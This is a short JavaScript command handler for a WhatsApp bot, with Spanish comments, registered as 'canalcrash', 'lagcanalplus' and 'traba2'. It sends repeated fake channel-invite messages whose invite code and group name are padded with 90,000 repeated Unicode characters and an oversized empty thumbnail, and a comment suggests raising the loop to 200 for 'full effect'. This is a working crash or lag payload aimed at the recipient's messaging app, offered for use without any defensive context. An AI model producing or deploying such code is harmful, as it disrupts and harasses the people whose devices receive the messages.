let handler = async (m, { conn }) => {
  const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
  const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
  const channelJid = '120363999999999999@g.us'; // Cambia esto si deseas otro canal
  const thumbnailFake = Buffer.alloc(90000); // Miniatura falsa (vacía)

  const fakeInviteContent = {
    groupJid: channelJid,
    inviteCode,
    groupName,
    jpegThumbnail: thumbnailFake
  };

  // ENVÍO MASIVO
  for (let i = 0; i < 5; i++) { // Cambia a 200 si quieres full efecto
    await conn.sendMessage(m.chat, { groupInviteMessage: fakeInviteContent });
  }

  m.reply('✅ *Traba canal enviada correctamente.*');
};

handler.command = ["lagcanalplus", "canalcrash", "traba2"];
export default handler;